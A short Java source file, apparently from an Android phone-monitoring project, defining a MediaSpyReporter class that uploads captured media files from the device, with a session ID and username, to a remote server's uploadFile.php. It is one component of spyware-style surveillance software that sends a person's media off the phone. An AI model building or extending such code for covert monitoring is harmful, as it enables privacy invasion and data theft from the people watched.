package th.ac.bu.mcop.android.spy.reporter;

import java.util.HashMap;
import java.util.Map;

import th.ac.bu.mcop.http.core.connection.Request;
import th.ac.bu.mcop.http.impl.connection.HttpMultipartRequest;
import th.ac.bu.mcop.mobile.monitor.core.Report;
import th.ac.bu.mcop.mobile.monitor.report.Media;

public class MediaSpyReporter extends SpyReporter {
	/**
	 * This is for remote storage folder name.
	 */
	private String username;
	
	public MediaSpyReporter(String username) {
		this.username = username;
	}
	
	@Override
	protected Request createRequest(Report report) {
		Media media = (Media) report;
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", getSession());
		parameters.put("username", username);
		parameters.put("type", media.type);
		parameters.put("file", null);
		return new HttpMultipartRequest(WEBAPI_SERVER_ROOT + "/uploadFile.php", parameters, media.file);
	}
}
